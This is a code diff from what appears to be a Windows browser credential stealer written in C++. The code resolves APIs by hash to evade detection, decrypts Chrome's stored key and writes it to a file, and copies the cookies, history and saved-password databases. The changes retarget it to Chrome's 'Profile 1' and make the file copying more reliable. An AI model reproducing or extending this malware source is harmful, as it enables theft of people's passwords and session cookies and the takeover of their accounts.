@@ -261,6 +261,14 @@ bool CreateCopyFile(char* filename, char* newFileName) {
             DWORD bytesRead = 0;
             DWORD bytesWritten = 0;
 
+            // Seek to beginning of file (Chrome may have already read through it)
+            LARGE_INTEGER zero;
+            zero.QuadPart = 0;
+            constexpr unsigned int hashSetFilePointerEx = ComplexHashForAnsi("SetFilePointerEx");
+            typedef BOOL(WINAPI* _SetFilePointerEx)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
+            _SetFilePointerEx pSetFilePointerEx = (_SetFilePointerEx)apiResolve.GetApiAddress(lpKernel32, hashSetFilePointerEx);
+            pSetFilePointerEx(hCopy, zero, NULL, FILE_BEGIN);
+
             ULONGLONG offset = 0;
 
             while (true) {
@@ -428,11 +436,18 @@ void DecryptKey() {
 
     char pathEdge[MAX_PATH] = { 0 };
     CopyStringA(path, pathEdge, MAX_PATH);
+    //char sSubEdge[] = {
+    //    '\\','G','o','o','g','l','e', '\\',
+    //    'C','h','r','o', 'm', 'e', '\\',
+    //    'U','s','e','r',' ','D','a','t','a', '\\',
+    //    'D', 'e', 'f', 'a', 'u', 'l', 't',
+    //    '\0'
+    //};
     char sSubEdge[] = {
         '\\','G','o','o','g','l','e', '\\',
         'C','h','r','o', 'm', 'e', '\\',
         'U','s','e','r',' ','D','a','t','a', '\\',
-        'D', 'e', 'f', 'a', 'u', 'l', 't',
+        'P', 'r', 'o', 'f', 'i', 'l', 'e', ' ', '1',
         '\0'
     };
     CopyStringA(sSubEdge, pathEdge + StrLen(pathEdge), MAX_PATH - StrLen(pathEdge));
@@ -672,12 +687,9 @@ void DecryptKey() {
         constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
         _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
         if (!pWriteFile) { return; }
-        //Write key to file in desktop
-        //char keyFileName[] = { 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '\0' };
-        //CopyStringA(keyFileName, pathMal + StrLen(pathMal), MAX_PATH - StrLen(pathMal));
         HANDLE hFile = pCreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);
-
+        pCloseHandle(hFile);
         constexpr unsigned int hashCopyFileA = ComplexHashForAnsi("CopyFileA");
         typedef BOOL(WINAPI* _CopyFileA)(
             LPCSTR lpExistingFileName,
@@ -690,16 +702,22 @@ void DecryptKey() {
         constexpr unsigned int hashSleep = ComplexHashForAnsi("Sleep");
         typedef VOID(WINAPI* _Sleep)(DWORD);
         _Sleep pSleep = (_Sleep)apiResolve.GetApiAddress(lpKernel32, hashSleep);
-        if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
-
-        }
-
-        if (!pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
-
-        }
 
         if (CreateCopyFile(orCookiesPath, cookiesPath)) {}
-        //for (int i = 0; i < 1000; i++) {
+
+        if (CreateCopyFile(orHistoryPath, historyPath)) {}
+
+        if (CreateCopyFile(orPasswordPath, passwordPath)) {}
+
+        //if (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
+
+        //}
+
+        //if (!pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
+
+        //}
+
+        //for (int i = 0; i < 10000; i++) {
         //    if (CreateCopyFile(orCookiesPath, cookiesPath)) {
         //        if (pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
         //            break;
